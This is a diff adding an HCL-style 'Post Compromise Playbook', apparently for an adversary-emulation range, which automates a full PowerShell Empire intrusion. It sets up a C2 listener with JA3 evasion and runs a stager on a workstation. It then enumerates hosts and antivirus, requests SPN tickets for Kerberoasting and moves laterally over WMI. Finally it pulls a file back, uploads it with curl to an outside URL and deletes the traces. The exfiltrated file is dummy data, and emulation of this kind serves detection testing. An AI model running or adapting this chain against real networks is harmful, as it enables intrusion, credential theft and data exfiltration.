@@ -1,0 +1,492 @@
+# Post Compromise Playbook
+
+local "function" "now" {
+    function_name = "timestamp"
+}
+
+local "function" "date_stamp" {
+    function_name       = "formatdate"
+    function_parameters = ["%m_%d_%Y_%H_%M", local.function.now]
+}
+
+local "function" "stager_decode" {
+    function_name       = "base64decode"
+    function_parameters = [resource.task.c2_task.create_stager.Output]
+}
+
+variable "domain_name" {
+    description = "The domain name to be associated with the external facing listeners."
+}
+
+variable "exfil_file" {
+    description = "File name to use for the exfil file."
+    default     = "exfil_file.txt"
+}
+
+variable "system_root_drive" {
+    description = "The drive letter where the system root resides for machines in the environment."
+    default     = "C"
+}
+
+variable "exfil_size" {
+    description = "Size of the exfil file to generate in megabytes."
+    default     = "524288000"
+}
+
+variable "initial_access_task_name" {
+    description = "The name of the remote task where the C2 implant should run."
+    default     = "workstation_host"
+}
+
+variable "lateral_movement_task_name" {
+    description = "The name of the remote task that should be targeted by the lateral movement module."
+    default     = "server_host"
+}
+
+data "tasks" "initial_access_task" {
+  task_name = variable.initial_access_task_name
+}
+
+data "tasks" "lateral_movement_task" {
+  task_name  = variable.lateral_movement_task_name
+}
+
+resource "workspace_put_url" "upload_url" {
+    path = "upload/"
+    file_name = variable.exfil_file
+}
+
+resource "random_string" "random_32" {
+  length      = 32
+  letters     = true
+  digits      = true
+  punctuation = false
+}
+
+resource "portgroup" "portgroup" {
+    portgroup_name        = "portgroup_${local.function.date_stamp}"
+    portgroup_description = "portgroup_${local.function.date_stamp}"
+}
+
+resource "portgroup_rule" "initial_access_task" {
+    portgroup_name   = resource.portgroup.portgroup.portgroup_name
+    portgroup_action = "add"
+    ip_ranges        = "${data.tasks.initial_access_task.public_ip}/32"
+    port             = "443"
+    ip_protocol      = "tcp"
+}
+
+resource "task" "c2_task" {
+    task_type       = "powershell_empire"
+    task_name       = "c2_task_${local.function.date_stamp}"
+    startup_actions = ["cert_gen","create_listener","create_stager"]
+
+    cert_gen = {
+        cert_type = "self-signed"
+        cert_country = "US"
+        cert_state = "California"
+        cert_locale = "San Francisco"
+        cert_org = "Havoc Inc."
+        cert_org_unit = "IT Security"
+        cert_host = "local_ip"
+    }
+
+    create_listener = {
+        listener_type = "http_malleable"
+        Name          = "http_malleable"
+        Profile       = "trevor.profile"
+        Host          = "https://appointments.${variable.domain_name}:443"
+        Port          = "443"
+        CertPath      = "/opt/Empire/empire/server/data/"
+        StagingKey    = resource.random_string.random_32.result
+        JA3_Evasion   = "True"
+    }
+
+    create_stager = {
+        Listener      = "http_malleable"
+        StagerName    = "multi/launcher"
+        Language      = "powershell"
+        StagerRetries = "60"
+        OutFile       = "launcher.ps1"
+    }
+}
+
+resource "listener" "c2_listener" {
+    listener_name = "c2_listener_${local.function.date_stamp}"
+    task_name     = resource.task.c2_task.task_name
+    portgroups    = [resource.portgroup.portgroup.portgroup_name]
+    host_name     = "appointments"
+    domain_name   = variable.domain_name
+    depends_on    = resource.portgroup_rule.initial_access_task.portgroup_name
+
+    listener_config = {
+        443 = {
+            listener_type = "HTTPS"
+        }
+    }
+}
+
+resource "file" "stager_upload" {
+    file_name     = resource.task.c2_task.create_stager.OutFile
+    file_contents = local.function.stager_decode
+}
+
+resource "workspace_get_url" "stager_download_url" {
+    path = "shared/"
+    file_name = resource.file.stager_upload.file_name
+}
+
+action "task_action" "download_stager" {
+    task_name    = data.tasks.initial_access_task.task_name
+    command      = "task_download_file"
+    essential    = "true"
+
+    task_download_file = {
+        url       = resource.workspace_get_url.stager_download_url.workspace_get_url
+        file_name = action.task_action.stager_download.download_from_workspace.file_name
+    }
+}
+
+action "task_action" "execute_stager" {
+    delay       = "180"
+    timeout     = "900"
+    depends_on  = resource.listener.c2_listener.listener_name
+    task_name   = data.tasks.initial_access_task.task_name
+    command     = "task_execute_command"
+    essential   = "true"
+    
+    task_execute_command = {
+        command = "powershell.exe arsenal\\${action.task_action.download_stager.task_download_file.file_name}"
+    }
+
+    action_function = {
+        wait_for_c2 = {
+            task_name = resource.task.c2_task.task_name
+        }
+    }
+}
+
+action "agent_action" "cli_checks_1" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+
+    execute_empire_agent_shell_command = {
+        command           = "$commandArray = @({whoami},{query user},{ipconfig /all},{netstat -an},{netstat -rn},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
+        wait_for_results  = "true"
+        completion_string = "done"
+    }
+}
+
+action "agent_action" "cli_checks_2" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.cli_checks_1
+
+    execute_empire_agent_shell_command = {
+        command           = "$commandArray = @({schtasks /Query},{tasklist},{qwinsta},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
+        wait_for_results  = "true"
+        completion_string = "done"
+    }
+}
+
+action "agent_action" "cli_checks_3" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.cli_checks_2
+
+    execute_empire_agent_shell_command = {
+        command           = "$commandArray = @({ls ${variable.system_root_drive}:\Program Files},{ls ${variable.system_root_drive}:\Documents and Settings\All Users\Start Menu\Programs\Startup},{ls ${variable.system_root_drive}:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup},{ls ${variable.system_root_drive}:\Windows\Prefetch},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
+        wait_for_results  = "true"
+        completion_string = "done"
+    }
+}
+
+action "agent_action" "drive_info" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.cli_checks_3
+
+    execute_empire_agent_shell_command = {
+        command          = "Get-PSDrive"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "systeminfo" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.drive_info
+
+    execute_empire_agent_shell_command = {
+        command          = "systeminfo"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "win32_product" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.systeminfo
+
+    execute_empire_agent_shell_command = {
+        command          = "Get-WmiObject -Class win32_Product"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "antivirusproduct" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_module"
+    depends_on = action.agent_action.win32_product
+
+    execute_empire_agent_module = {
+        module            = "powershell/situational_awareness/host/antivirusproduct"
+        wait_for_results  = "true"
+        completion_string = "completed"
+    }
+}
+
+action "agent_action" "seatbelt_user" {
+    delay      = "15"
+    timeout    = "300"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_module"
+    depends_on = action.agent_action.antivirusproduct
+
+    execute_empire_agent_module = {
+        module            = "powershell/situational_awareness/host/seatbelt"
+        wait_for_results  = "true"
+        completion_string = "Completed"
+
+        module_args = {
+            Group        = "User"
+            Full         = "False"
+            Command      = ""
+            Computername = ""
+            Username     = ""
+            Password     = ""
+            Quiet        = ""
+        }
+    }
+}
+
+action "agent_action" "seatbelt_system" {
+    delay      = "15"
+    timeout    = "300"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_module"
+    depends_on = action.agent_action.seatbelt_user
+
+    execute_empire_agent_module = {
+        module            = "powershell/situational_awareness/host/seatbelt"
+        wait_for_results  = "true"
+        completion_string = "Completed"
+
+        module_args = {
+            Group        = "System"
+            Full         = "False"
+            Command      = ""
+            Computername = ""
+            Username     = ""
+            Password     = ""
+            Quiet        = ""
+        }
+    }
+}
+
+action "agent_action" "get_domain_controller" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_module"
+    depends_on = action.agent_action.seatbelt_system
+
+    execute_empire_agent_module = {
+        module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
+        wait_for_results  = "true"
+        completion_string = "completed"
+    }
+}
+
+action "agent_action" "request_spn_tickets" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_module"
+    depends_on = action.agent_action.get_domain_controller
+
+    execute_empire_agent_module = {
+        module            = "powershell/management/invoke_script"
+        wait_for_results  = "true"
+        completion_string = "completed"
+
+        module_args = {
+            ScriptPath = "/opt/havoc/shared/request_spn_tickets.ps1"
+            ScriptCmd  = "Invoke-RequestSpnTickets"
+        }
+    }
+}
+
+action "agent_action" "query_user" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.request_spn_tickets
+
+    execute_empire_agent_shell_command = {
+        command          = "query user /SERVER:${data.tasks.lateral_movement_task.local_ip.0}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "get_services" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.query_user
+
+    execute_empire_agent_shell_command = {
+        command          = "tasklist /s ${data.tasks.lateral_movement_task.local_ip.0}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "get_shares" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.get_services
+
+    execute_empire_agent_shell_command = {
+        command          = "net view \\${data.tasks.lateral_movement_task.local_ip.0} /All"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "create_remote_exfil_file" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_module"
+    depends_on = action.agent_action.get_shares
+
+    execute_empire_agent_module = {
+        module            = "powershell/lateral_movement/invoke_wmi"
+        wait_for_results  = "false"
+        
+        module_args = {
+            ComputerName     = data.tasks.lateral_movement_task.local_ip.0
+            Listener         = ""
+            Command          = "fsutil file createNew ${variable.system_root_drive}:\${variable.exfil_file} ${variable.exfil_size}"
+            CredID           = ""
+            Obfuscate        = ""
+            ObfuscateCommand = ""
+            Bypasses         = ""
+            UserName         = ""
+            Password         = ""
+            UserAgent        = ""
+            Proxy            = ""
+            ProxyCreds       = ""
+        }
+    }
+}
+
+action "agent_action" "pull_data" {
+    delay      = "180"
+    timeout    = "900"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.create_remote_exfil_file
+
+    execute_empire_agent_shell_command = {
+        command          = "Copy-Item -Path \\${data.tasks.lateral_movement_task.local_ip.0}\${variable.system_root_drive}$\${variable.exfil_file} -Destination ${variable.system_root_drive}:\${variable.exfil_file}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "upload_exfil_file" {
+    delay      = "15"
+    timeout    = "600"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.pull_data
+
+    execute_empire_agent_shell_command = {
+        command          = "${variable.system_root_drive}:\Windows\System32\curl.exe -s -H 'Content-Type:application/octet-stream' --upload-file ${variable.system_root_drive}:\${variable.exfil_file} '${resource.workspace_put_url.upload_url.workspace_put_url}'; echo done"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "delete_exfil_file" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.upload_exfil_file
+
+    execute_empire_agent_shell_command = {
+        command          = "Remove-Item -Path ${variable.system_root_drive}:\${variable.exfil_file}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "delete_remote_exfil_file" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.delete_exfil_file
+
+    execute_empire_agent_shell_command = {
+        command          = "Remove-Item -Path \\${data.tasks.lateral_movement_task.local_ip.0}\${variable.system_root_drive}$\${variable.exfil_file}"
+        wait_for_results = "true"
+    }
+}
+
+action "task_action" "kill_stager" {
+    delay      = "10"
+    timeout    = "180"
+    depends_on = action.agent_action.delete_remote_exfil_file
+    task_name  = variable.c2_task_name
+    command    = "kill_agent"
+    
+    kill_agent = {
+        Name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
+    }
+}
